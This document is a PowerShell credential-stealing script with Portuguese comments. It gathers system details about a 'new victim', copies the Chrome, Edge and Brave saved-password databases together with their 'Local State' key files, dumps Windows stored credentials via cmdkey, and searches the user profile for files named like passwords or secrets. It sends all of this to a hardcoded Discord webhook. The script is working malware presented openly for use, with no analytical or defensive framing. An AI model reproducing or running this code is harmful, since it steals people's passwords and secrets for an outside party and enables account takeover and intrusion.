# Script de Extração de Credenciais e Exfiltração via Webhook
$webhookUrl = "https://discord.com/api/webhooks/1563550985274531890/nmcjdI8zDoYiEV9aoW7miLtlWHLRr7g1eujQtHya92oSWuVUuJdbgmosATTyYFSz4qAi"

function Send-ToWebhook($content) {
    $payload = @{ content = $content } | ConvertTo-Json
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
}

try {
    # 1. Coleta de Informações Básicas do Sistema
    $sysInfo = "Usuário: $(whoami) | PC: $env:COMPUTERNAME | OS: $((Get-WmiObject Win32_OperatingSystem).Caption)"
    Send-ToWebhook "--- Nova Vítima Detectada ---`n$sysInfo"

    # 2. Extração de Senhas do Chrome/Edge (Caminhos Comuns)
    $paths = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
    )

    foreach ($path in $paths) {
        if (Test-Path $path) {
            # Copia o arquivo para evitar erro de 'arquivo em uso' pelo navegador
            $tempFile = "$env:TEMP\login_data_tmp"
            Copy-Item -Path $path -Destination $tempFile -Force
            
            # Nota: A extração real de senhas Chromium exige a chave de criptografia do 'Local State'
            # e a descriptografia via API do Windows (CryptUnprotectData). 
            # Como o PowerShell puro não faz isso facilmente sem DLLs externas, 
            # o método mais eficiente é exfiltrar o arquivo de banco de dados e o Local State.
            
            $localStatePath = $path.Replace("Login Data", "Local State")
            if (Test-Path $localStatePath) {
                $localState = Get-Content $localStatePath -Raw
                Send-ToWebhook "Local State de $path`n`n$localState"
            }
            
            # Envia o arquivo de senhas em base64 (se for pequeno) ou via upload
            $bytes = [System.IO.File]::ReadAllBytes($tempFile)
            $base64 = [Convert]::ToBase64String($bytes)
            Send-ToWebhook "Login Data (Base64) de $path`n`n$base64"
            Remove-Item $tempFile
        }
    }

    # 3. Coleta de Senhas Salvas no Windows (Credenciais do Cofre)
    $creds = cmdkey /list | Out-String
    if ($creds) {
        Send-ToWebhook "Credenciais do Windows (cmdkey):`n`n$creds"
    }

    # 4. Coleta de arquivos de configuração comuns (FTP, SSH, etc)
    $configFiles = Get-ChildItem -Path "$env:USERPROFILE" -Include *.txt, *.ini, *.config, *.env -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "pass|pwd|secret|key" }
    foreach ($file in $configFiles) {
        $content = Get-Content $file.FullName -Raw
        Send-ToWebhook "Arquivo Sensível: $($file.FullName)`n`n$content"
    }

} catch {
    Send-ToWebhook "Erro durante a execução: $($_.Exception.Message)"
}
